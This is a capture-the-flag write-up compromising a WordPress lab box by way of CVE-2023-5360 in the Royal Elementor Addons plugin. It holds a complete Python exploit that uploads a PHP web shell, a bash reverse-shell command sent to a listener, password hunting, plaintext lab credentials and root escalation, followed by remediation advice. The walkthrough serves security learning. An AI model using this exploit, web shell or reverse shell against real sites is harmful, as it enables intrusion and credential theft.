![8c3bfef1774b4ca3b9c9ecdce58fb5a1](https://github.com/user-attachments/assets/a725c711-bbd3-403a-af94-bc7aabb9a04d)

To access the target domain locally, I edited the `/etc/hosts` file and mapped the domain name to the target IP address.

```bash
sudo nano /etc/hosts
```

I added the following line:

```text
 172.20.14.182 gridloy.hv
```

After saving the file, the website was accessible at:

```
http://gridloy.hv
```
### Content Review

When visiting the website, I observed a minimalistic blog layout. While browsing several posts, I noticed that the author consistently used the pseudonym **"Currol"**.

<img width="1913" height="873" alt="cevap 1" src="https://github.com/user-attachments/assets/d39b33b3-e52c-4ac2-b126-802f60447ae0" />


✅ **Answer 1:** The author's pseudonym is **Currol**.

---

###  Full WPScan Analysis

To identify WordPress components and vulnerabilities, I ran WPScan with aggressive detection enabled.

```bash
wpscan --url http://gridloy.hv \
  --enumerate u,p,t,tt,cb,dbe \
  --plugins-detection aggressive \
  --api-token "xxxxxxxxxx"
```

<img width="825" height="758" alt="cevap 2" src="https://github.com/user-attachments/assets/c62b6a21-f49d-4e34-9672-8b53b3e37cf0" />

### Key Findings

* **WordPress Version:** 6.4.2 (outdated)
* **Active Theme:** Minimal Blogger
* **Identified User:** admin
* **Vulnerable Plugin:** Royal Elementor Addons v1.3.78
* **Critical CVE:** CVE-2023-5360 (Unauthenticated File Upload)

---

### CVE-2023-5360

The vulnerability exists due to missing nonce validation in the `wpr_addons_upload_file` AJAX endpoint. This allows unauthenticated users to upload arbitrary files, including PHP web shells.
Based on the WPScan results, I identified **CVE-2023-5360**, an unauthenticated file upload vulnerability affecting the *Royal Elementor Addons* plugin.  

First, I created the exploit script file:

```bash
nano exploit.py
```

```python
#!/usr/bin/env python3
import requests, re, json, sys

def get_nonce(target):
    r = requests.get(target, verify=False)
    m = re.search(r'var\s+WprConfig\s*=\s*({.*?});', r.text)
    return json.loads(m.group(1)).get("nonce") if m else None

def upload_shell(target, nonce):
    ajax = target.rstrip('/') + '/wp-admin/admin-ajax.php'
    files = {"uploaded_file": ("shell.php", b'<?php system($_GET["cmd"]); ?>')}
    data = {
        "action": "wpr_addons_upload_file",
        "wpr_addons_nonce": nonce
    }
    r = requests.post(ajax, data=data, files=files, verify=False)
    return json.loads(r.text)["data"]["url"] if r.status_code == 200 else None

# Ana işlem
target = "http://gridloy.hv"
print("[*] Nonce değeri alınıyor...")
nonce = get_nonce(target)

if not nonce:
    print("[-] Nonce bulunamadı!")
    sys.exit(1)

print(f"[+] Nonce bulundu: {nonce}")
print("[*] Web shell yükleniyor...")

shell_url = upload_shell(target, nonce)

if shell_url:
    print(f"[+] Web shell başarıyla yüklendi!")
    print(f"[+] Shell URL: {shell_url}")
    print(f"\n[+] Test komutu:")
    print(f"curl -s \"{shell_url}?cmd=id\"")
else:
    print("[-] Shell yükleme başarısız!")
```

I then pasted the exploit code into the file and saved it (`Ctrl + X`, `Y`, `Enter`).

### Exploit Script Execution

After preparing the script, I executed it to trigger the vulnerability:

```bash
python3 exploit.py
```

The script successfully retrieved the nonce value and uploaded the PHP web shell.  
The output confirmed a successful exploitation:

```text
[*] Retrieving nonce value...
[+] Nonce found: abc123def456ghi789
[*] Uploading web shell...
[+] Web shell uploaded successfully!
[+] Shell URL: http://gridloy.hv/wp-content/uploads/wpr-addons/forms/shell.php
```

The script also provided a test command to verify command execution:

```bash
curl -s "http://gridloy.hv/wp-content/uploads/wpr-addons/forms/shell.php?cmd=id"
```
<img width="822" height="190" alt="cevap 3" src="https://github.com/user-attachments/assets/236351b7-a5f8-4ee5-81f5-4813bf5f904a" />

### Listener

```bash
nc -lvnp 4444
```

### 6.2 Reverse Shell Trigger

```bash
curl "http://gridloy.hv/wp-content/uploads/wpr-addons/forms/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'"
```

📸 **Screenshot 6:** Reverse shell as `www-data`

---

## 7. Post-Exploitation Enumeration

### 7.1 Sensitive File Discovery

```bash
find /var/www/html/wordpress -type f -name "*.txt" -exec grep -i password {} \;
```

📸 **Screenshot 7:** `my_passwords.txt` discovery

### 7.2 Extracted Credentials

```text
EMAIL: beth@gridloy.hv
WORDPRESS USER: admin
WORDPRESS PASS: b2tGAIvRDpJpNit6q2
MYSQL USER: root
MYSQL PASS: LhfJ5DuAYN5nsSvB
SYSTEM ROOT PASS: aceRyanDI
```

✅ **Answer 2:** WordPress password is **b2tGAIvRDpJpNit6q2**

---

## 8. WordPress Admin & Database Access

### 8.1 WordPress Admin Login

```text
URL: http://gridloy.hv/wp-login.php
Username: admin
Password: b2tGAIvRDpJpNit6q2
```

📸 **Screenshot 8:** WordPress admin panel

### 8.2 MySQL Access

```bash
mysql -u root -p
```

### 8.3 Unpublished Comment Discovery

```sql
SELECT comment_author, comment_content
FROM wp_comments
WHERE comment_approved = 0;
```

📸 **Screenshot 9:** Pending comment

✅ **Answer 3:** Unpublished comment author is **Judson Braun**

---

## 9. Privilege Escalation – Root Access

```bash
su root
```

📸 **Screenshot 10:** Root shell

---

## 10. Final Flag – Site Owner Information

```bash
cat /root/site_owner_informations.txt
```

📸 **Screenshot 11:** Site owner information

✅ **Answer 4:** The real name of **Currol** is **Beth Ryan**

---

## 11. Vulnerability Summary

* CVE-2023-5360 – Unauthenticated File Upload
* Outdated WordPress Core & Plugins
* Plaintext password storage
* Password reuse across services

---

## 12. Remediation Recommendations

* Update Royal Elementor Addons (>= 1.3.79)
* Keep WordPress core, themes, and plugins updated
* Never store credentials in plaintext files
* Enforce strong and unique passwords
* Perform regular security audits

---

✅ **CTF Completed Successfully**

---

> ✍️ Prepared for **GitHub** and **Medium** publication

